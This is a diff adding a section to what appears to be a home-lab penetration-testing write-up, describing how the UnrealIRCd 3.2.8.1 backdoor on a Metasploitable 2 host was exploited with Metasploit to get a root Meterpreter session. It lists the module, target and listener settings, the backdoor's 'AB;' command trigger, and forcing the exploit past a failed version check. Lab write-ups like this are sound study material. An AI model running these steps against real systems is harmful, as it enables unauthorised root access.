@@ -167,3 +167,39 @@ whether the shell is actually live.
 
 ### Screenshot
 ![Samba usermap_script exploit](screenshots/samba-exploit.png)
+
+## Third exploit: UnrealIRCd 3.2.8.1 backdoor
+
+**Target:** 192.168.56.30, port 6667 (IRC)
+**Tool:** Metasploit Framework (msfconsole)
+**Module:** exploit/unix/irc/unreal_ircd_3281_backdoor
+
+### What the vulnerability is
+UnrealIRCd's official source was compromised in 2009; a backdoor was 
+inserted so that any input containing "AB;" followed by a command gets 
+executed directly on the system shell, no authentication required.
+
+### Steps
+1. Identified UnrealIRCd on port 6667 via nmap.
+2. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+3. `set RHOSTS 192.168.56.30`
+4. `set LHOST 192.168.56.10`
+5. Initial run failed version check: "not-vulnerable: UnrealIRCd 3.2.8.1 
+   not detected." Nmap's version scan couldn't confirm the exact build from 
+   the banner either.
+6. Forced the exploit past the check: `set ForceExploit true`, then `run`.
+
+### Result
+Meterpreter session opened successfully despite the version-check warning, 
+since the warning only reflects a failed banner match, not the actual 
+outcome. Confirmed root access with `getuid`.
+
+### Lesson learned
+A module's own "not exploitable" message is a pre-check, not a verdict. 
+When there's good reason to believe a target is vulnerable (Metasploitable 2 
+is documented to ship this backdoor), ForceExploit can bypass an 
+unreliable version fingerprint. Always confirm actual success with 
+getuid/whoami afterward rather than trusting status messages alone.
+
+### Screenshot
+![UnrealIRCd backdoor exploit](screenshots/unrealircd-exploit.png)
